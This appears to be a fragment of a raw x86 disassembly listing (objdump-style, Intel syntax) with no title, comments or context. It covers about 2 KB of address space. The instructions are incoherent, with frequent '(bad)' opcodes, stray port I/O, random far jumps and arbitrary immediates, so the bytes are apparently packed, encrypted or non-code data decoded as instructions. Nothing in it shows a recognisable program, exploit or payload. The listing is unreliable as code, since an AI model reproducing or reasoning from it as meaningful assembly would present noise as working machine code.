  4057af:	jecxz  0x405800
  4057b1:	adc    eax,ecx
  4057b3:	mov    gs,WORD PTR [edi+eiz*8-0x7a]
  4057b7:	daa    
  4057b8:	inc    ebx
  4057b9:	xor    bh,bl
  4057bb:	daa    
  4057bc:	scas   al,BYTE PTR es:[edi]
  4057bd:	sbb    edi,DWORD PTR [esi+0x1654223a]
  4057c3:	cmp    DWORD PTR [ebx+0x38],ecx
  4057c6:	pop    esp
  4057c7:	xchg   ecx,eax
  4057c8:	loopne 0x405816
  4057ca:	cmp    DWORD PTR [ebx-0xe],esp
  4057cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057ce:	iret   
  4057cf:	mov    esi,0x1995e727
  4057d4:	(bad)  
  4057d5:	clc    
  4057d6:	repz xchg ebp,eax
  4057d8:	sub    BYTE PTR [edx-0x7b5b1aed],bl
  4057de:	ja     0x4057b5
  4057e0:	cmp    eax,0x8921d267
  4057e5:	dec    ebx
  4057e6:	stc    
  4057e7:	add    bl,ch
  4057e9:	dec    ebx
  4057ea:	loopne 0x4057b7
  4057ec:	in     al,0x2a
  4057ee:	adc    eax,0x94f85759
  4057f3:	and    eax,0x33aa58bb
  4057f8:	call   0xaf3a:0x50229439
  4057ff:	mov    DWORD PTR [esi-0x63040210],eax
  405805:	cmp    eax,edx
  405807:	cmp    al,0xaf
  405809:	xlat   BYTE PTR ds:[ebx]
  40580a:	dec    esi
  40580b:	jns    0x405801
  40580d:	je     0x4057be
  40580f:	in     al,dx
  405810:	ss gs mov ebp,0x7394f8ee
  405817:	cmp    dl,dl
  405819:	jns    0x40585c
  40581b:	outs   dx,BYTE PTR ds:[esi]
  40581c:	out    0x2d,eax
  40581e:	mov    ebx,0x610bd1a6
  405823:	cmp    al,0x2f
  405825:	pop    edi
  405826:	inc    esp
  405827:	add    ecx,DWORD PTR [edi+ecx*2]
  40582a:	and    eax,0x867dfba3
  40582f:	mov    al,0x7e
  405831:	dec    edi
  405832:	push   ds
  405833:	imul   edi,DWORD PTR [ebx-0x2ae7cb0e],0xd1dfcc49
  40583d:	cli    
  40583e:	ins    DWORD PTR es:[edi],dx
  40583f:	cmc    
  405840:	gs push ebx
  405842:	xlat   BYTE PTR ds:[ebx]
  405843:	cmp    ebx,edi
  405845:	cmp    dl,al
  405847:	xor    eax,0x1916adc0
  40584c:	sbb    DWORD PTR [ebp+0x6e4e448e],ecx
  405852:	pop    ebp
  405853:	cmp    eax,0x7aad9760
  405858:	shl    BYTE PTR [eax+ebx*2],cl
  40585b:	aam    0xa
  40585d:	scas   eax,DWORD PTR es:[edi]
  40585e:	add    DWORD PTR [ecx],edx
  405860:	xchg   ebp,eax
  405861:	mov    ah,0xef
  405863:	pop    eax
  405864:	gs pushf 
  405866:	mov    al,ds:0x4ea26fef
  40586b:	sub    al,0xab
  40586d:	xor    al,0xb7
  40586f:	ss jnp 0x4057f3
  405872:	shr    BYTE PTR [ebx],cl
  405874:	(bad)  
  405875:	mov    ch,0x96
  405877:	js     0x4058f4
  405879:	jmp    0x481f:0xc1bae038
  405880:	mov    ah,cl
  405882:	ror    ah,0x8a
  405885:	not    DWORD PTR [eax-0x24]
  405888:	push   0x3ae26de
  40588d:	mov    eax,0x9d54d560
  405892:	test   al,0xf5
  405894:	mov    dh,0xec
  405896:	fidiv  DWORD PTR [edi-0x6ea7c6a5]
  40589c:	adc    BYTE PTR [ebp+eax*8-0x4a],0x8e
  4058a1:	ror    DWORD PTR [edx-0x5a],1
  4058a4:	push   edx
  4058a5:	gs push 0x4
  4058a8:	arpl   WORD PTR [ebp-0x48],bx
  4058ab:	xor    eax,0xa6d76912
  4058b0:	inc    ebp
  4058b1:	(bad)  fs:[ebx+0x712f4577]
  4058b8:	js     0x4058f6
  4058ba:	xchg   ebp,eax
  4058bb:	out    0xea,eax
  4058bd:	and    DWORD PTR [ebx+0x25a892df],0xffffffcc
  4058c4:	inc    edi
  4058c5:	mov    al,ds:0x71b94720
  4058ca:	clc    
  4058cb:	js     0x4058c4
  4058cd:	xlat   BYTE PTR ds:[ebx]
  4058ce:	pushf  
  4058cf:	sar    BYTE PTR [eax+ecx*4-0x17],1
  4058d3:	lock or BYTE PTR [ebp-0x26278912],bh
  4058da:	push   0xb0ac5fa6
  4058df:	aas    
  4058e0:	cli    
  4058e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058e2:	dec    esi
  4058e3:	sub    bl,cl
  4058e5:	jno    0x4058bd
  4058e7:	cmp    BYTE PTR [edi-0x73],cl
  4058ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058eb:	dec    esi
  4058ec:	cdq    
  4058ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058ee:	cmp    eax,0x902ebded
  4058f3:	push   esi
  4058f4:	mov    al,0x26
  4058f6:	or     ebx,edx
  4058f8:	std    
  4058f9:	enter  0x9190,0xb6
  4058fd:	dec    edx
  4058fe:	sub    DWORD PTR [ebx],0x13
  405901:	mov    ebp,0xb0e61304
  405906:	xlat   BYTE PTR ds:[ebx]
  405907:	and    eax,0xd0d0c059
  40590c:	mov    cl,0xd1
  40590e:	jmp    0x97655930
  405913:	push   esi
  405914:	xchg   edi,eax
  405915:	dec    edx
  405916:	mov    ecx,0xb70cddba
  40591b:	ret    
  40591c:	xor    al,0xce
  40591e:	xor    esi,esp
  405920:	int    0xf9
  405922:	out    dx,al
  405923:	repnz cmp al,0x3d
  405926:	or     al,BYTE PTR [edx]
  405928:	push   0xffffffd6
  40592a:	inc    esi
  40592b:	cmp    cl,BYTE PTR [ecx]
  40592d:	aaa    
  40592e:	push   ds
  40592f:	xchg   ebx,eax
  405930:	dec    ecx
  405931:	pop    esi
  405932:	adc    DWORD PTR [esi+0x1],0x1794c12d
  405939:	push   ds
  40593a:	(bad)
  40593d:	xor    eax,0x93fe1c41
  405943:	mov    bl,0xf0
  405945:	jg     0x40598e
  405947:	jge    0x4058f5
  405949:	jecxz  0x40599c
  40594b:	xchg   esp,eax
  40594c:	mov    al,0xf4
  40594e:	sub    ch,al
  405950:	ja     0x405904
  405952:	sar    DWORD PTR [esi-0x1e0b9334],1
  405958:	xlat   BYTE PTR ds:[ebx]
  405959:	pushf  
  40595a:	rcl    BYTE PTR [ebx+0xe],0xbc
  40595e:	mov    ds:0x9a4bff25,al
  405963:	popf   
  405964:	mov    ebx,0x5d12b35f
  405969:	fucomi st,st(4)
  40596b:	add    eax,0x79f60d43
  405970:	jb     0x4059e7
  405972:	ror    ebp,1
  405974:	fist   WORD PTR [ebx]
  405976:	mov    esp,0x71de2c67
  40597b:	out    0x1a,eax
  40597d:	mov    edi,0xc6d6d2fa
  405982:	mov    esp,0x2734c62f
  405987:	repnz adc BYTE PTR [eax+0x5f],0x61
  40598c:	aas    
  40598d:	sahf   
  40598e:	pop    edi
  40598f:	shr    DWORD PTR [ecx-0x10dee7a7],cl
  405995:	xchg   ebx,eax
  405996:	and    al,BYTE PTR [ecx+0x7dcc0d88]
  40599c:	pushf  
  40599d:	and    eax,0xdfb9810a
  4059a2:	mov    ebx,fs
  4059a4:	mov    esi,0xa1dcdaf3
  4059a9:	push   esp
  4059aa:	jl     0x40593e
  4059ac:	mov    dl,0x5c
  4059ae:	nop
  4059af:	cmp    ecx,DWORD PTR [esi]
  4059b1:	xchg   ecx,eax
  4059b2:	inc    esp
  4059b3:	(bad)  
  4059b4:	(bad)  
  4059b5:	retf   0xd635
  4059b8:	push   ebp
  4059b9:	cmp    BYTE PTR [esi-0x44e08124],0xb5
  4059c0:	xor    eax,0xb31f5e0c
  4059c5:	cmp    al,0x3b
  4059c7:	sbb    esp,esp
  4059c9:	or     BYTE PTR [esi+0x2edd0873],bh
  4059cf:	ficom  DWORD PTR [edi-0x1]
  4059d2:	bound  edx,QWORD PTR [eax+0x39]
  4059d5:	cli    
  4059d6:	mov    edx,0x161dea85
  4059db:	dec    edi
  4059dc:	inc    ebp
  4059dd:	in     eax,0xbb
  4059df:	scas   al,BYTE PTR es:[edi]
  4059e0:	mov    ds:0x78995ca6,eax
  4059e5:	inc    ebx
  4059e6:	jb     0x405a2b
  4059e8:	scas   eax,DWORD PTR es:[edi]
  4059e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ea:	xor    ch,bl
  4059ec:	daa    
  4059ed:	in     al,dx
  4059ee:	jge    0x4059ae
  4059f0:	ror    DWORD PTR [ebx+edx*8+0x54598e1a],1
  4059f7:	mov    esi,0xc09ec150
  4059fc:	xchg   edx,ecx
  4059fe:	fidiv  WORD PTR [edi+0x3dc154f]
  405a04:	sbb    al,0x22
  405a06:	nop
  405a07:	sbb    DWORD PTR [edx+0x33],esp
  405a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a0b:	jle    0x405a59
  405a0d:	sub    ebp,edx
  405a0f:	or     edi,eax
  405a11:	mov    al,ds:0xd95d041c
  405a16:	push   ebx
  405a17:	clc    
  405a18:	les    ecx,FWORD PTR [ebx]
  405a1a:	sbb    al,0x20
  405a1c:	adc    ah,dh
  405a1e:	jne    0x4059b3
  405a20:	mov    al,0x1f
  405a22:	int3   
  405a23:	add    DWORD PTR [edx-0x5a1b1080],edi
  405a29:	and    eax,0x8929d7e4
  405a2e:	mov    ebx,0xd8193fb6
  405a33:	dec    edi
  405a34:	or     dh,cl
  405a36:	pop    esp
  405a37:	shl    DWORD PTR [edx],1
  405a39:	lods   al,BYTE PTR ds:[esi]
  405a3a:	adc    ebx,DWORD PTR [esi-0x55]
  405a3d:	and    al,0x54
  405a3f:	mov    eax,0x7886ce2
  405a44:	pop    ebx
  405a45:	xchg   ebx,eax
  405a46:	or     DWORD PTR [ecx],ecx
  405a48:	cmova  edx,ebx
  405a4b:	fisttp DWORD PTR [edx]
  405a4d:	adc    esi,DWORD PTR [eax]
  405a4f:	cli    
  405a50:	push   ss
  405a51:	pop    DWORD PTR [edx]
  405a53:	xor    ch,BYTE PTR [ecx-0x3e]
  405a56:	nop
  405a57:	xchg   ecx,eax
  405a58:	out    0x4b,al
  405a5a:	fld    QWORD PTR [edi]
  405a5c:	(bad)  
  405a5d:	cmp    al,0x9b
  405a5f:	mov    al,0x78
  405a61:	and    DWORD PTR [esp+edx*2+0x27],edi
  405a65:	sahf   
  405a66:	jle    0x405a5d
  405a68:	push   eax
  405a69:	and    esp,DWORD PTR [ebp+0x2e]
  405a6c:	por    mm1,mm7
  405a6f:	int    0x20
  405a71:	outs   dx,BYTE PTR ds:[esi]
  405a72:	xchg   esp,eax
  405a73:	repnz push edi
  405a75:	xchg   BYTE PTR [ecx+0x195e9dba],bl
  405a7b:	add    al,0x1d
  405a7d:	ret    0xb768
  405a80:	das    
  405a81:	stos   BYTE PTR es:[edi],al
  405a82:	adc    bh,BYTE PTR [esi+ebx*1+0x1741259]
  405a89:	repz sti 
  405a8b:	jnp    0x405a69
  405a8d:	rcl    BYTE PTR [edi],1
  405a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a90:	sub    BYTE PTR [eax+ebp*2-0x19],dl
  405a94:	ja     0x405a81
  405a96:	push   ss
  405a97:	movd   mm5,DWORD PTR [ebx]
  405a9a:	push   esi
  405a9b:	and    DWORD PTR [edi+0x2cd587ac],edi
  405aa1:	push   esp
  405aa2:	test   DWORD PTR [edi-0x22],ebp
  405aa5:	js     0x405b0c
  405aa7:	push   esp
  405aa8:	in     eax,0x7b
  405aaa:	inc    esi
  405aab:	test   eax,edx
  405aad:	add    ch,al
  405aaf:	xor    DWORD PTR [eax+edi*1-0x5608d340],ebp
  405ab6:	cdq    
  405ab7:	mov    esp,0x35dc6027
  405abc:	mov    bh,0xd5
  405abe:	xlat   BYTE PTR ds:[ebx]
  405abf:	cmp    BYTE PTR [esi-0x17bd074],bh
  405ac5:	mov    dh,0x6b
  405ac7:	xor    BYTE PTR [ebx+eax*4],ch
  405aca:	mov    DWORD PTR [ebx+0x2cbd295c],0xb62b53e3
  405ad4:	jo     0x405a74
  405ad6:	jbe    0x405b2d
  405ad8:	jecxz  0x405aaa
  405ada:	sub    DWORD PTR [eax-0x2a1c82a0],edi
  405ae0:	or     al,al
  405ae2:	push   edi
  405ae3:	(bad)  
  405ae4:	mov    edx,0x94bc53e4
  405ae9:	loop   0x405b54
  405aeb:	add    dh,BYTE PTR [ebp-0x5bef5743]
  405af1:	fcmovnb st,st(6)
  405af3:	xor    dl,BYTE PTR [ebx+0x25]
  405af6:	les    edi,FWORD PTR [ebp+0x4b]
  405af9:	push   edi
  405afa:	int3   
  405afb:	psubq  mm1,mm6
  405afe:	loop   0x405b2c
  405b00:	addr16 leave 
  405b02:	xor    al,0x6a
  405b04:	sbb    BYTE PTR [edx*4-0xa45af14],bh
  405b0b:	inc    edx
  405b0c:	jmp    0x405b44
  405b0e:	loop   0x405aa0
  405b10:	add    edx,esi
  405b12:	(bad)  
  405b13:	cli    
  405b14:	cmp    esp,DWORD PTR [ebp+0x67821027]
  405b1a:	pop    ebp
  405b1b:	mov    ds:0x8b71791c,al
  405b21:	adc    eax,0xc7219d8a
  405b26:	add    edx,ebp
  405b28:	cmp    edi,edi
  405b2a:	or     edx,ecx
  405b2c:	fwait
  405b2d:	and    eax,0x23195d1c
  405b32:	lods   eax,DWORD PTR ds:[esi]
  405b33:	push   0x4d
  405b35:	jmp    0xf52153b2
  405b3a:	xchg   ebx,eax
  405b3b:	inc    ecx
  405b3c:	jb     0x405b90
  405b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b3f:	mov    bh,0x7b
  405b41:	xor    DWORD PTR [edi+edx*4+0x52b072fc],0xffffffa3
  405b49:	push   edx
  405b4a:	fist   WORD PTR [esi-0x6]
  405b4d:	xchg   ebp,eax
  405b4e:	sub    al,0xf1
  405b50:	push   ecx
  405b51:	mov    edi,0xa4dc3ca
  405b56:	retf   0x2e27
  405b59:	pop    ds
  405b5a:	sbb    ecx,ecx
  405b5c:	adc    edx,DWORD PTR [ebx+ebp*1]
  405b5f:	push   0xf52a971f
  405b64:	inc    edx
  405b65:	xor    BYTE PTR [esi+0x3c],bl
  405b68:	into   
  405b69:	jmp    0x8c9614b6
  405b6e:	mov    dl,bh
  405b70:	mov    WORD PTR [ebp+0x608473a0],?
  405b76:	shl    DWORD PTR [edx-0x62],0x93
  405b7a:	lods   al,BYTE PTR ds:[esi]
  405b7b:	bsr    edx,DWORD PTR [edi-0x5b62e339]
  405b82:	add    edx,DWORD PTR [edx-0x53]
  405b85:	fistp  QWORD PTR [esi+0x3f]
  405b88:	xchg   esp,eax
  405b89:	imul   esi,DWORD PTR [edx+0x420cee6f],0xff00bc5
  405b93:	cmp    eax,0xb2ab8f06
  405b98:	dec    edi
  405b99:	out    0x7d,al
  405b9b:	fistp  QWORD PTR [edx-0x55b28a81]
  405ba1:	lock imul BYTE PTR [ebx-0x49]
  405ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ba6:	inc    eax
  405ba7:	add    dh,0x24
  405baa:	mov    ebp,0xf423c1ee
  405baf:	adc    cl,BYTE PTR [eax*8+0x60ee7f31]
  405bb6:	inc    ebx
  405bb7:	dec    esi
  405bb8:	retf   0x442f
  405bbb:	dec    edi
  405bbc:	es push ebp
  405bbe:	arpl   WORD PTR [ebx+0xff0854b],dx
  405bc4:	push   ss
  405bc5:	sub    BYTE PTR [ebp-0x73],dh
  405bc8:	inc    esi
  405bc9:	jne    0x405c1f
  405bcb:	btc    ecx,0xd1
  405bcf:	mov    cs,WORD PTR [eax+0x56]
  405bd2:	ins    BYTE PTR es:[edi],dx
  405bd3:	stos   BYTE PTR es:[edi],al
  405bd4:	test   BYTE PTR [ecx],cl
  405bd6:	inc    ecx
  405bd7:	enter  0x72e4,0x4c
  405bdb:	dec    ebx
  405bdc:	bound  ecx,QWORD PTR [esi-0x2e]
  405bdf:	(bad)  
  405be0:	and    dl,bl
  405be2:	fwait
  405be3:	test   ebx,ebp
  405be5:	and    al,0x9
  405be7:	pop    edi
  405be8:	inc    esi
  405be9:	mov    edx,0x932689f6
  405bee:	cmp    eax,0xfaa0e441
  405bf3:	pop    ebx
  405bf4:	mov    dh,0xa0
  405bf6:	dec    esi
  405bf7:	scas   al,BYTE PTR es:[edi]
  405bf8:	fidivr WORD PTR [eax]
  405bfa:	arpl   ax,si
  405bfc:	mov    ch,bh
  405bfe:	pop    ecx
  405bff:	lods   eax,DWORD PTR ds:[esi]
  405c00:	mov    al,ds:0xd9b37ec8
  405c05:	out    dx,al
  405c06:	pusha  
  405c07:	push   0xffffffe2
  405c09:	cwde   
  405c0a:	cmp    al,0x16
  405c0c:	dec    esp
  405c0d:	or     edi,esp
  405c0f:	push   esp
  405c10:	icebp  
  405c11:	mov    bh,0xf5
  405c13:	arpl   WORD PTR [esi+0x17],ax
  405c16:	mov    cl,0x84
  405c18:	adc    BYTE PTR [ecx+0x51368c05],dh
  405c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c1f:	or     edi,edx
  405c21:	cli    
  405c22:	aam    0xcb
  405c24:	fbstp  TBYTE PTR [edi]
  405c26:	sub    eax,0x80920eb9
  405c2b:	out    0x68,eax
  405c2d:	push   esi
  405c2e:	inc    ebp
  405c2f:	fiadd  DWORD PTR [ecx-0x713911fd]
  405c35:	cld    
  405c36:	jno    0x405c1e
  405c38:	aaa    
  405c39:	sub    edi,DWORD PTR [esi+0x1814fca]
  405c3f:	out    dx,al
  405c40:	mov    ah,0xe8
  405c42:	push   es
  405c43:	push   cs
  405c44:	cli    
  405c45:	mov    edi,0xca89aef1
  405c4a:	cs sbb ebp,ecx
  405c4d:	jb     0x405c0b
  405c4f:	mov    ebp,DWORD PTR [ebp+ebx*1+0x363337ea]
  405c56:	iret   
  405c57:	enter  0x73b6,0x0
  405c5b:	sbb    dl,BYTE PTR [edx]
  405c5d:	or     eax,0x8bd07516
  405c62:	adc    al,0x46
  405c64:	jl     0x405c62
  405c66:	lea    esp,[ebx+0x5d0a759e]
  405c6c:	xor    al,BYTE PTR [ecx-0x5]
  405c6f:	and    edi,ebp
  405c71:	xchg   BYTE PTR [eax],bl
  405c73:	dec    ecx
  405c74:	ss pop esp
  405c76:	jecxz  0x405c6c
  405c78:	popf   
  405c79:	out    0xe7,al
  405c7b:	pop    esi
  405c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c7d:	lock mov eax,0x19c54d33
  405c83:	arpl   WORD PTR [edx-0x57386894],bp
  405c89:	sub    DWORD PTR [edx-0x525b5614],ebp
  405c8f:	ret    0xe322
  405c92:	retf   0x73f
  405c95:	mov    ch,0xac
  405c97:	jae    0x405c92
  405c99:	ret    0x422c
  405c9c:	les    ebx,FWORD PTR [ebx+0x76]
  405c9f:	xlat   BYTE PTR ds:[ebx]
  405ca0:	pop    esi
  405ca1:	outs   dx,DWORD PTR ds:[esi]
  405ca2:	xchg   ecx,eax
  405ca3:	in     eax,dx
  405ca4:	ds and eax,0xe2047d0
  405caa:	(bad)  
  405cab:	in     al,dx
  405cac:	ds loop 0x405cd6
  405caf:	jg     0x405d0c
  405cb1:	mov    ebp,0x272776f1
  405cb6:	pop    edi
  405cb7:	movups XMMWORD PTR [ecx+0x62],xmm5
  405cbb:	and    dh,BYTE PTR [ebp+0x51]
  405cbe:	jmp    0x6292:0xe9e23f4f
  405cc5:	cmp    ecx,DWORD PTR [eax+eax*2+0x53]
  405cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cca:	xchg   esp,eax
  405ccb:	pushf  
  405ccc:	or     ebx,ecx
  405cce:	sahf   
  405ccf:	nop
  405cd0:	out    0xef,eax
  405cd2:	mov    bh,0xf2
  405cd4:	ds test al,0xe5
  405cd7:	sub    esp,DWORD PTR [ecx+0x7d]
  405cda:	mov    al,ds:0x8b378fff
  405cdf:	pop    ss
  405ce0:	test   ecx,edi
  405ce2:	mov    ecx,0x41a9378
  405ce7:	or     eax,0xfe8d7d47
  405cec:	cdq    
  405ced:	and    BYTE PTR ds:0x3a4b9d65,bh
  405cf3:	popa   
  405cf4:	aad    0xf9
  405cf6:	adc    ch,cl
  405cf8:	cmp    DWORD PTR [esi-0x1491b10c],edi
  405cfe:	mov    ebx,0x4994a023
  405d03:	inc    ebp
  405d04:	add    dh,BYTE PTR [ecx-0x29]
  405d07:	mov    cl,BYTE PTR [ecx+0x7587e876]
  405d0d:	mov    al,ds:0xd2429ae7
  405d12:	sbb    esp,ecx
  405d14:	out    0x55,eax
  405d16:	es ja  0x405d07
  405d19:	jle    0x405d47
  405d1b:	push   edi
  405d1c:	inc    esi
  405d1d:	pop    edx
  405d1e:	dec    edx
  405d1f:	push   eax
  405d20:	fmul   st(7),st
  405d22:	in     eax,0xc4
  405d24:	or     eax,0x41c5d85b
  405d29:	add    dl,al
  405d2b:	pop    ebp
  405d2c:	inc    ebp
  405d2d:	and    dh,al
  405d2f:	in     eax,dx
  405d30:	es aad 0xba
  405d33:	out    0x16,eax
  405d35:	lds    edi,FWORD PTR [eax+0x26517248]
  405d3b:	dec    esi
  405d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d3d:	leave  
  405d3e:	xlat   BYTE PTR ds:[ebx]
  405d3f:	fstp   DWORD PTR [edi]
  405d41:	pop    esp
  405d42:	iret   
  405d43:	xor    dl,BYTE PTR [esi+0x2a67b454]
  405d49:	(bad)  
  405d4b:	xchg   edx,edx
  405d4d:	mov    dl,BYTE PTR [eax-0xadcbbb2]
  405d53:	push   ebp
  405d54:	xchg   esi,eax
  405d55:	push   esp
  405d56:	jge    0x405d50
  405d58:	or     DWORD PTR [eax],ebx
  405d5a:	das    
  405d5b:	push   ebx
  405d5c:	and    al,0x33
  405d5e:	sub    esi,esi
  405d60:	sbb    al,0x8e
  405d62:	adc    bl,0xe0
  405d65:	mov    edi,0x5f31662b
  405d6a:	loopne 0x405daf
  405d6c:	and    al,0xe6
  405d6e:	or     eax,0x5eacc884
  405d73:	repnz (bad) 
  405d76:	cli    
  405d77:	pop    esi
  405d78:	pop    esp
  405d79:	ret    
  405d7a:	xchg   ebx,eax
  405d7b:	dec    esp
  405d7c:	push   esi
  405d7d:	test   al,0x14
  405d7f:	jmp    FWORD PTR ds:0x29d262e0
  405d85:	bound  ebp,QWORD PTR [edx]
  405d87:	xor    dl,0x46
  405d8a:	cmp    bl,BYTE PTR [ebp+0x77bd2dc2]
  405d90:	sub    BYTE PTR [edx+0x4c],bl
  405d93:	adc    cl,bl
  405d95:	imul   ecx,ecx,0x6a147147
  405d9b:	in     eax,dx
  405d9c:	ss leave 
  405d9e:	mov    dh,0xd9
  405da0:	dec    ecx
  405da1:	jno    0x405d4b
  405da3:	sub    BYTE PTR [edi+0x14],bh
  405da6:	inc    edx
  405da7:	scas   al,BYTE PTR es:[edi]
  405da8:	cmp    ch,bl
  405daa:	sub    eax,0x1d0a9441
  405daf:	sub    DWORD PTR [ebp+0x3e5b985e],ebp
  405db5:	aas    
  405db6:	out    dx,al
  405db7:	inc    edx
  405db8:	xchg   ebx,eax
  405db9:	mov    bh,ch
  405dbb:	dec    ebx
  405dbc:	shr    BYTE PTR [ebx+0x3d],1
  405dbf:	nop
  405dc0:	jbe    0x405e20
  405dc2:	aad    0x7e
  405dc4:	fmul   QWORD PTR [edi+0x5bc3fe89]
  405dca:	mov    ecx,DWORD PTR [edx]
  405dcc:	pusha  
  405dcd:	or     DWORD PTR [esi-0x418360b],esp
  405dd3:	stos   DWORD PTR es:[edi],eax
  405dd4:	or     BYTE PTR [ecx+0x5724f3a1],0xf9
  405ddb:	add    al,0x6c
  405ddd:	(bad)  
  405dde:	and    dh,BYTE PTR [edx+0x5493c12f]
  405de4:	push   eax
  405de5:	fild   WORD PTR [eax-0x655f5cb]
  405deb:	mov    BYTE PTR [ebx+0xd],bl
  405dee:	enter  0xead6,0x1f
  405df2:	mov    bl,0xa1
  405df4:	out    0x75,eax
  405df6:	stos   DWORD PTR es:[edi],eax
  405df7:	cmp    BYTE PTR [eax],0x51
  405dfa:	test   eax,0x6f1ff575
  405dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e00:	imul   ebp,DWORD PTR [ebp+0x53a8abb9],0x45
  405e07:	lock mov dl,BYTE PTR [edi]
  405e0a:	push   cs
  405e0b:	test   al,ah
  405e0d:	into   
  405e0e:	gs push ss
  405e10:	mov    al,0x50
  405e12:	xor    bl,al
  405e14:	and    esi,esp
  405e16:	cmp    bh,BYTE PTR [ebx+0xda247db]
  405e1c:	pop    ebx
  405e1d:	in     al,dx
  405e1e:	inc    esi
  405e1f:	div    dl
  405e21:	int    0x4c
  405e23:	(bad)  
  405e24:	cld    
  405e25:	lea    ebp,[edx]
  405e27:	inc    eax
  405e28:	enter  0xd3b7,0xa8
  405e2c:	sti    
  405e2d:	stos   DWORD PTR es:[edi],eax
  405e2e:	aaa    
  405e2f:	fs ins BYTE PTR es:[edi],dx
  405e31:	mov    edx,0x24c53735
  405e36:	mov    dl,0xdb
  405e38:	jl     0x405dde
  405e3a:	or     ah,ah
  405e3c:	mov    ebp,0x8416fbef
  405e41:	jg     0x405eac
  405e43:	cmp    dl,BYTE PTR [edi]
  405e45:	popf   
  405e46:	jl     0x405e0f
  405e48:	pushf  
  405e49:	sbb    esi,edi
  405e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e4c:	or     DWORD PTR [ebx+0x12],0x229cccb3
  405e53:	sub    bh,BYTE PTR [ebp+0x36b13d14]
  405e59:	adc    ah,ah
  405e5b:	shl    DWORD PTR [ebx-0x2a],0x4d
  405e5f:	mov    bl,0xe9
  405e61:	fcom   QWORD PTR [edx-0x71220456]
  405e67:	add    eax,0x46dd6998
  405e6c:	stc    
  405e6d:	xchg   ecx,eax
  405e6e:	and    dl,al
  405e70:	sub    ch,BYTE PTR fs:[edi+0x48]
  405e74:	xchg   esp,eax
  405e75:	xchg   edi,esp
  405e77:	pusha  
  405e78:	xor    dl,bh
  405e7a:	rcr    BYTE PTR [ecx-0x13],0x70
  405e7e:	inc    bl
  405e80:	mov    edx,0x8a5da0b5
  405e85:	jmp    0x3881:0xa655f61d
  405e8c:	add    eax,0xeeae7827
  405e91:	sbb    ah,cl
  405e93:	sti    
  405e94:	shl    al,cl
  405e96:	shl    bh,1
  405e98:	sub    ebx,DWORD PTR [edx+0x429c4fec]
  405e9e:	nop
  405e9f:	hlt    
  405ea0:	cmp    al,bh
  405ea2:	aam    0xa4
  405ea4:	inc    edx
  405ea5:	mov    esp,gs
  405ea7:	ja     0x405ef9
  405ea9:	arpl   WORD PTR [esi],bp
  405eab:	push   esp
  405eac:	add    DWORD PTR [edi],ebp
  405eae:	fs out 0x5c,al
  405eb1:	cmc    
  405eb2:	clc    
  405eb3:	cdq    
  405eb4:	ds ret 0x2f05
  405eb8:	int    0x16
  405eba:	or     al,0x49
  405ebc:	mov    al,ds:0xdc504597
  405ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ec2:	push   ss
  405ec3:	test   DWORD PTR [ebx+eax*1-0x5a],edi
  405ec7:	push   edi
  405ec8:	pusha  
  405ec9:	pop    ss
  405eca:	push   0x71781780
  405ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ed0:	sbb    dh,BYTE PTR [ebx+esi*8]
  405ed3:	jb     0x405ec2
  405ed5:	cmp    al,0x5a
  405ed7:	push   esi
  405ed8:	fist   WORD PTR ds:0xd3e1c86a
  405ede:	js     0x405eb2
  405ee0:	dec    ebx
  405ee1:	jbe    0x405f17
  405ee3:	mov    bh,0x65
  405ee5:	ss int 0x63
  405ee8:	push   ebx
  405ee9:	mov    eax,ds:0x746a3361
  405eee:	rcl    DWORD PTR [edx],1
  405ef0:	arpl   WORD PTR [esi-0x51],si
  405ef3:	and    eax,0xc2a8d236
  405ef8:	or     DWORD PTR [edx],eax
  405efa:	and    BYTE PTR [esi],0xd2
  405efd:	jecxz  0x405f46
  405eff:	dec    edx
  405f00:	(bad)  
  405f01:	stc    
  405f02:	or     BYTE PTR [edx+0x1c],dh
  405f05:	fidivr WORD PTR [edi+0x16]
  405f08:	cmc    
  405f09:	or     ah,ah
  405f0b:	addr16 fs push eax
  405f0e:	popa   
  405f0f:	fcmovne st,st(5)
  405f11:	or     DWORD PTR [eax],esp
  405f13:	jg     0x405f69
  405f15:	adc    BYTE PTR [ecx+eiz*1-0x3ca5daac],ch
  405f1c:	sub    eax,0xc9f1560b
  405f21:	mov    ch,0x8f
  405f23:	daa    
  405f24:	mov    eax,ds:0x18bf8d40
  405f29:	in     eax,dx
  405f2a:	xor    ebx,DWORD PTR [edi+eiz*8]
  405f2d:	jg     0x405ed9
  405f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f30:	xor    eax,0xb5a680a3
  405f35:	(bad)  
  405f36:	dec    eax
  405f37:	xchg   ebx,edi
  405f39:	mov    bl,0xf2
  405f3b:	push   es
  405f3c:	scas   al,BYTE PTR es:[edi]
  405f3d:	xor    ch,bh
  405f3f:	rol    BYTE PTR [ecx-0x2c],0xf6
  405f43:	sub    bh,dh
  405f45:	pop    edi
  405f46:	mov    dh,BYTE PTR [edx]
  405f48:	sub    edx,ebp
  405f4a:	bound  edi,QWORD PTR [esi-0x14]
  405f4d:	and    DWORD PTR ds:0x8279e3f7,ebp
  405f53:	adc    al,0x82
  405f55:	push   ss
  405f56:	cmp    edi,DWORD PTR [ebx+0x25ebc7b0]
  405f5c:	push   esi
  405f5d:	iret   
  405f5e:	adc    al,0xf9
  405f60:	jb     0x405f8b
  405f62:	mov    ebx,0xd0ac15d1
  405f67:	(bad)  
  405f68:	fucomp st(3)
